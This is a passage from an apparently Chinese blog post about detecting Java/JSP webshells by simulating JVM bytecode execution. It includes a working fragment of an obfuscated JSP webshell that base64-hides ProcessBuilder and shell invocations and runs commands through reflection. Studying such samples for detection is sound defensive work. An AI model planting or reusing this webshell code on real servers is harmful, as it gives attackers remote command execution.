    Build By LandGrey
     list = new ArrayList();
            BASE64Decoder decoder = new BASE64Decoder();
            BASE64Encoder encoder = new BASE64Encoder();
            String fileSeparator = String.valueOf(java.io.File.separatorChar);
            if(fileSeparator.equals("\\")){
                list.add(new String(decoder.decodeBuffer("Y21k")));
                list.add(new String(decoder.decodeBuffer("L2M=")));
            }else{
                list.add(new String(decoder.decodeBuffer("L2Jpbi9iYXNo")));
                list.add(new String(decoder.decodeBuffer("LWM=")));
            }
            list.add(new String(decoder.decodeBuffer(str)));
            Class PB = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy")));
            Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer("c3RhcnQ="))).invoke(PB.getDeclaredConstructors()[0].newInstance(list));
            Scanner sc = new Scanner(s.getInputStream()).useDelimiter("\\A");
            String result = "";
            result = sc.hasNext() ? sc.next() : result;
            sc.close();
            return encoder.encode(result.getBytes("UTF-8"));
        }
    %>
这个webshell首先是把恶意类名，要执行的命令等都先base64进行了编码，然后再通过反射调用的。检测该webshell有一个麻烦。就是我们需要在模拟堆栈的时候同时传递base64的字符串，再调用base64解码的时候我们的模拟代码也需要同时解码，这样调用反射的时候才能知道反射的类名是什么
为了实现这一点，我在模拟jvm执行LDC指令的时候，把LDC指令压入的字符串，也就是"Y21k"，"L2M="
这些，塞入了操作数栈中，跟着方法的模拟进行传递。
当调用如append、substring等操作字符串的值时，代码会模拟真实的情况，对字符串进行拼接或者裁剪
然后当流入到decodeBuffer的时候，对字符串进行模拟解码然后塞入操作数栈
最后当攻击者反射调用方法时，如果反射的内容是ProcessBuilder或者Runtime，那必定是webshell。因为正常业务如果调用到Runtime，他会光明正大的直接调用，鬼鬼祟祟的通过反射调用恶意类，基本是攻击者所为。
再举一个webshel的例子
    Just For Fun
    Build By LandGrey
这次反射调用没有使用base64，而是使用了字节数组还原为String的方式，那么思路一样，我们需要在模拟代码中模拟字节数组还原String的过程。
首先当组装字节数组的时候是用BIPUSH把ascii码压入数栈，然后用BASTORE指令把ascii码放到数组中，我们在模拟BIPUSH指令的代码中，把ascii码压入模拟的操作数栈的栈顶，
然后在模拟BASTORE的指令的代码中把ascii放到一个ArrayList中。
当调用到new String(byte[]）的时候触发到以下代码，把ArrayList中的ascii码还原成String，然后压入操作数栈进行传递。
在后面如果这个String为Runtime或者ProcessBuilder而其又被反射调用，就会被判定为webshell，如果没被反射调用就是正常文件。
主要流程，就是这样更多的细节都在代码里。目前只能检测Runtime、ProcessBuilder的一句话木马，冰蝎等多功能木马的马上就会加上。start项目不迷路哦，
### 最后的话
感谢@4ra1n和@threedr3am师傅前面的研究的铺垫
参考：